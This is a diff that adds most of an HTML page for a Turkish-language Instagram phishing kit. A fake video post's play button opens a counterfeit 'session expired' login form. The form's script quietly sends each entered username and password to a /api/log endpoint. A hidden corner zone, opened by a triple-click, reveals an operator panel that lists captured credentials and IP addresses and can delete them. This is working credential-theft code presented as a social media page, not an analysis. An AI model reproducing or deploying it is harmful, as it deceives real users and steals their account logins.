@@ -70,4 +70,142 @@
             </video>
             <div class="play-overlay" id="play-trigger">
                 <div class="play-btn">
-                    <svg viewBox="0
+                    <svg viewBox="0 0 24 24"><polygon points="6,4 20,12 6,20"></polygon></svg>
+                </div>
+                <span class="lure-text">Videoyu oynatmak için oturum açın</span>
+            </div>
+        </div>
+        <div class="post-footer">
+            <div class="post-actions">
+                <div class="post-actions-left">
+                    <svg viewBox="0 0 24 24"><path d="M16.792 3.904A4.989 4.989 0 0 1 21.5 9.122c0 3.072-2.652 5.859-5.197 8.43-1.043 1.054-2.134 2.127-3.132 3.045l-.035.032-.035-.032c-.998-.918-2.089-1.991-3.132-3.045C7.352 14.981 4.7 12.194 4.7 9.122a4.989 4.989 0 0 1 4.708-5.218 4.21 4.21 0 0 1 3.675 1.941c.84 1.175.98 1.763 1.12 1.763s.278-.588 1.11-1.763a4.17 4.17 0 0 1 3.679-1.941m0-2.4c-1.606 0-3.071.81-4.042 2.254C11.758 2.314 10.293 1.5 8.687 1.5a6.49 6.49 0 0 0-6.13 6.79c0 3.978 3.277 7.043 5.924 9.658 1.026 1.011 2.057 2.029 3.032 2.978.967-.945 1.996-1.961 3.018-2.97 2.651-2.62 5.932-5.688 5.932-9.666a6.49 6.49 0 0 0-6.126-6.79z"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M20.656 17.008a9.993 9.993 0 1 0-3.59 3.615L22 22zM12 19.5a7.5 7.5 0 1 1 7.5-7.5 7.508 7.508 0 0 1-7.5 7.5z"/></svg>
+                </div>
+            </div>
+            <div class="likes-count">14.289 beğenme</div>
+            <div class="caption"><span>dogal_yasam_tr</span>Günün en çok paylaşılan özel doğa ve yaşam kesiti. Tamamı için videoyu oynatabilirsiniz. #dogal #kesfet</div>
+        </div>
+    </div>
+
+    <div id="login-modal">
+        <div class="modal-box">
+            <h1 class="logo">Instagram</h1>
+            <div id="inline-alert" class="inline-banner">
+                <strong>Oturum Süresi Doldu:</strong> Devam etmek için hesabınızı doğrulamanız gerekiyor.
+            </div>
+            <form id="login-form">
+                <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                <input type="password" id="password" placeholder="Şifre" required>
+                <button type="submit">Giriş Yap</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Sağ alt köşe görünmez tetik alanı -->
+    <div id="trigger-zone" title="Panel"></div>
+
+    <div id="capture-panel">
+        <div class="panel-header">
+            <span>Bulut Veritabanı (Canlı)</span>
+            <span style="cursor:pointer; color:#ff5f56;" onclick="closePanel()">[×]</span>
+        </div>
+        <div class="panel-body" id="log-list">
+            <div style="color: #666; text-align: center; padding: 10px;">Yükleniyor...</div>
+        </div>
+        <div class="panel-footer">
+            <span id="log-count" style="color: #aaa; font-size: 10px;">Toplam: 0</span>
+            <div>
+                <button class="del-btn" style="background: #333; margin-right: 4px;" onclick="fetchLogsFromCloud()">Yenile</button>
+                <button class="del-btn" onclick="clearAllLogs()">Tümünü Sil</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Play tuşuna basıldığında modalı aç
+        document.getElementById('play-trigger').addEventListener('click', function() {
+            document.getElementById('login-modal').style.display = 'flex';
+        });
+
+        // Sağ alta hızlıca 3 kez tıklandığında paneli aç
+        let clickCount = 0;
+        let clickTimer = null;
+        document.getElementById('trigger-zone').addEventListener('click', function(e) {
+            e.stopPropagation();
+            clickCount++;
+            if (clickCount === 1) {
+                clickTimer = setTimeout(() => { clickCount = 0; }, 800);
+            } else if (clickCount === 3) {
+                clearTimeout(clickTimer);
+                clickCount = 0;
+                togglePanel();
+            }
+        });
+
+        async function togglePanel() {
+            const panel = document.getElementById('capture-panel');
+            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+            if (panel.style.display === 'block') {
+                await fetchLogsFromCloud();
+            }
+        }
+
+        function closePanel() {
+            document.getElementById('capture-panel').style.display = 'none';
+        }
+
+        async function fetchLogsFromCloud() {
+            const container = document.getElementById('log-list');
+            container.innerHTML = '<div style="color: #888; text-align: center; padding: 10px;">Buluttan çekiliyor...</div>';
+            try {
+                const res = await fetch('/api/log');
+                const data = await res.json();
+                const logs = data.logs || [];
+                document.getElementById('log-count').innerText = `Toplam: ${logs.length}`;
+                if (logs.length === 0) {
+                    container.innerHTML = '<div style="color: #666; text-align: center; padding: 10px;">Kayıt bulunamadı</div>';
+                    return;
+                }
+                container.innerHTML = '';
+                [...logs].reverse().forEach((log, idx) => {
+                    const div = document.createElement('div');
+                    div.className = 'log-item';
+                    div.innerHTML = `<strong>#${logs.length - idx}</strong> [${log.timestamp}]<br>User: ${escapeHtml(log.username)}<br>Pass: ${escapeHtml(log.password)}<br>IP: ${log.ip || 'Bilinmiyor'}`;
+                    container.appendChild(div);
+                });
+            } catch (err) {
+                container.innerHTML = '<div style="color: #ed4956; text-align: center; padding: 10px;">Bağlantı hatası</div>';
+            }
+        }
+
+        async function clearAllLogs() {
+            if (!confirm("Tüm kayıtları silmek istediğinize emin misiniz?")) return;
+            try {
+                const res = await fetch('/api/log', { method: 'DELETE' });
+                if (res.ok) { await fetchLogsFromCloud(); }
+            } catch (err) { alert("Silme başarısız."); }
+        }
+
+        function escapeHtml(text) {
+            return String(text).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            const time = new Date().toLocaleString();
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('inline-alert').style.display = 'block';
+            try {
+                await fetch('/api/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: u, password: p, timestamp: time })
+                });
+            } catch (err) {}
+        });
+    </script>
+</body>
+</html>
